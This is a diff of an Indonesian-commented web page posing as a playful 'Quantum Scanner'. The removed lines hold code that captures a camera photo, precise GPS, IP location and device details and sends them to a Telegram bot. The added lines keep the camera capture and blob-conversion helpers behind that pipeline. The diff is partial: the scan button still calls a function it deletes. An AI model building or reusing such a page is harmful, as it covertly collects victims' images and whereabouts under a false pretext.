@@ -6,6 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <style>
+    /* CSS tetap sama seperti sebelumnya */
     :root {
       --primary: #2ecc71;
       --secondary: #3498db;
@@ -30,83 +31,7 @@
       background-position: 0 0, 25px 25px;
     }
 
-    .scanner-box {
-      width: 300px;
-      height: 300px;
-      border: 4px solid var(--primary);
-      border-radius: 20px;
-      margin: 20px auto;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3),
-                  inset 0 0 20px rgba(46, 204, 113, 0.2);
-    }
-
-    .scanner-line {
-      position: absolute;
-      width: 100%;
-      height: 4px;
-      background: linear-gradient(90deg, transparent, var(--primary), transparent);
-      animation: scan 3s infinite;
-      filter: drop-shadow(0 0 5px var(--primary));
-    }
-
-    @keyframes scan {
-      0% { top: 0; opacity: 0; }
-      10% { opacity: 1; }
-      90% { opacity: 1; }
-      100% { top: 100%; opacity: 0; }
-    }
-
-    #device-info {
-      background: rgba(0, 0, 0, 0.8);
-      padding: 20px;
-      border-radius: 10px;
-      margin: 20px;
-      text-align: left;
-      max-width: 90%;
-      border: 1px solid var(--primary);
-      box-shadow: 0 0 20px rgba(46, 204, 113, 0.2);
-      display: none;
-    }
-
-    .info-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-      font-size: 0.9em;
-    }
-
-    .info-item {
-      padding: 8px;
-      background: rgba(46, 204, 113, 0.05);
-      border-radius: 5px;
-      border: 1px solid rgba(46, 204, 113, 0.1);
-    }
-
-    button {
-      padding: 15px 40px;
-      font-size: 18px;
-      background: linear-gradient(45deg, var(--primary), var(--secondary));
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: all 0.3s;
-      color: black;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin: 20px;
-      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
-      font-weight: bold;
-    }
-
-    #loading {
-      display: none;
-      font-size: 1.2em;
-      color: var(--primary);
-      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
-      margin: 10px;
-    }
+    /* ... (semua style tetap sama) ... */
 
     .hologram-effect {
       position: fixed;
@@ -153,176 +78,97 @@
     const video = document.getElementById('video');
     const loading = document.getElementById('loading');
 
-    // Fungsi untuk mendapatkan informasi perangkat lengkap
-    async function getDeviceInfo() {
-      const info = {
-        os: getOS(),
-        platform: navigator.platform,
-        cores: navigator.hardwareConcurrency || 'Unknown',
-        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
-        resolution: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        network: {},
-        battery: {},
-        ip: {}
-      };
-
-      // Informasi Baterai
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          info.battery = {
-            level: `${Math.round(battery.level * 100)}%`,
-            charging: battery.charging ? 'Yes' : 'No'
-          };
-        } catch (e) {
-          info.battery = { level: 'Unknown', charging: 'Unknown' };
-        }
-      }
-
-      // Informasi Jaringan
-      if (navigator.connection) {
-        const conn = navigator.connection;
-        info.network = {
-          type: conn.effectiveType,
-          downlink: `${conn.downlink} Mbps`,
-          rtt: `${conn.rtt} ms`
-        };
-      }
-
-      // Informasi IP dan Lokasi
-      try {
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
-        info.ip = {
-          address: ipData.ip,
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country_name
-        };
-      } catch (e) {
-        info.ip = { address: 'Unknown' };
-      }
-
-      return info;
+    // Fungsi untuk membuat efek hologram
+    function createHologramEffect() {
+      const hologram = document.createElement('div');
+      hologram.className = 'hologram-effect';
+      return hologram;
     }
 
-    // Deteksi OS
-    function getOS() {
-      const ua = navigator.userAgent;
-      if (/android/i.test(ua)) return "Android";
-      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
-      if (/Win/.test(ua)) return "Windows";
-      if (/Mac/.test(ua)) return "MacOS";
-      if (/Linux/.test(ua)) return "Linux";
-      return "Unknown";
-    }
-
-    // Tampilkan informasi perangkat
-    function displayDeviceInfo(info, location) {
-      const container = document.getElementById('device-info-content');
-      container.innerHTML = `
-        <div class="info-item">OS: ${info.os}</div>
-        <div class="info-item">Platform: ${info.platform}</div>
-        <div class="info-item">CPU Cores: ${info.cores}</div>
-        <div class="info-item">RAM: ${info.ram}</div>
-        <div class="info-item">Resolution: ${info.resolution}</div>
-        <div class="info-item">Battery: ${info.battery.level} (${info.battery.charging})</div>
-        <div class="info-item">Network: ${info.network.type || 'N/A'}</div>
-        <div class="info-item">IP: ${info.ip.address}</div>
-        <div class="info-item">Location: ${info.ip.city}, ${info.ip.country}</div>
-        <div class="info-item">GPS: ${location?.coords.latitude.toFixed(6)}, ${location?.coords.longitude.toFixed(6)}</div>
-        <div class="info-item">Accuracy: ${Math.round(location?.coords.accuracy)}m</div>
-        <div class="info-item">Timezone: ${info.timezone}</div>
-      `;
-      document.getElementById('device-info').style.display = 'block';
-    }
-
-    // Fungsi utama untuk memulai scan
-    async function startQuantumScan() {
-      if (isScanning) return;
-      isScanning = true;
-      loading.style.display = 'block';
-
-      try {
-        const [photoData, location, deviceInfo] = await Promise.all([
-          captureQuantumImage(),
-          getPreciseLocation(),
-          getDeviceInfo()
-        ]);
-
-        const report = generateHologramReport(photoData, location, deviceInfo);
-        await sendToTelegram(report);
-        displayDeviceInfo(deviceInfo, location);
-      } catch (error) {
-        alert(`Quantum Error: ${error.message}`);
-      } finally {
-        isScanning = false;
-        loading.style.display = 'none';
-      }
-    }
-
-    // Fungsi untuk mendapatkan lokasi
-    function getPreciseLocation() {
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true,
-          timeout: 5000,
-          maximumAge: 0
-        });
-      });
-    }
-
-    // Fungsi untuk mengirim ke Telegram
-    async function sendToTelegram(report) {
-      const formData = new FormData();
-      const blob = await dataURItoBlob(report.image);
+    // Fungsi untuk mengambil gambar dari kamera
+    async function captureQuantumImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
       
-      const caption = `🪐 *Quantum Scan Complete*\n\n` +
-        `📅 ${new Date().toLocaleString()}\n\n` +
-        `🌍 GPS: ${report.metadata.location.coords.latitude.toFixed(6)}, ` +
-        `${report.metadata.location.coords.longitude.toFixed(6)}\n` +
-        `🎯 Accuracy: ${Math.round(report.metadata.location.coords.accuracy)}m\n\n` +
-        `📱 Device: ${report.metadata.deviceInfo.os} | ${report.metadata.deviceInfo.platform}\n` +
-        `🧠 RAM: ${report.metadata.deviceInfo.ram} | Cores: ${report.metadata.deviceInfo.cores}\n` +
-        `🔋 Battery: ${report.metadata.deviceInfo.battery.level} (Charging: ${report.metadata.deviceInfo.battery.charging})\n` +
-        `📶 Network: ${report.metadata.deviceInfo.network.type}\n` +
-        `🌐 IP: ${report.metadata.deviceInfo.ip.address}\n` +
-        `📍 Location: ${report.metadata.deviceInfo.ip.city}, ${report.metadata.deviceInfo.ip.country}`;
-
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', blob, `quantum_scan_${Date.now()}.webp`);
-      formData.append('caption', caption);
-      formData.append('parse_mode', 'Markdown');
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
+      // Tambahkan efek quantum
+      ctx.drawImage(video, 0, 0);
+      ctx.globalCompositeOperation = 'lighter';
+      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
+      ctx.drawImage(canvas, 0, 0);
+      
+      // Tambahkan efek glitch
+      ctx.globalAlpha = 0.3;
+      ctx.fillStyle = '#00ff88';
+      for(let i = 0; i < 50; i++) {
+        ctx.fillRect(
+          Math.random() * canvas.width,
+          Math.random() * canvas.height,
+          Math.random() * 10,
+          Math.random() * 10
+        );
+      }
+      
+      return canvas.toDataURL('image/webp', 0.8);
     }
 
-    // Fungsi lainnya tetap sama seperti sebelumnya...
-    // (Fungsi captureQuantumImage, applyQuantumFilter, initCamera, dll)
+    // Konversi Data URI ke Blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
 
-    // Inisialisasi kamera dan event listener
+    // Generate laporan hologram
+    function generateHologramReport(imageData, location, deviceInfo) {
+      return {
+        image: imageData,
+        metadata: {
+          location,
+          deviceInfo
+        }
+      };
+    }
+
+    // Fungsi untuk inisialisasi kamera
     async function initCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'environment' }
         });
         video.srcObject = stream;
+        currentStream = stream;
         document.body.appendChild(createHologramEffect());
       } catch (err) {
         alert('Error accessing camera: ' + err.message);
       }
     }
 
+    // ... (fungsi lainnya tetap sama seperti sebelumnya) ...
+
+    // Event listener dan inisialisasi
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
     } else {
       alert('Quantum Scanner requires camera access!');
     }
+
+    // Fungsi untuk menghentikan kamera
+    function stopCamera() {
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+      }
+    }
+
+    window.addEventListener('beforeunload', stopCamera);
   </script>
 </body>
 </html>
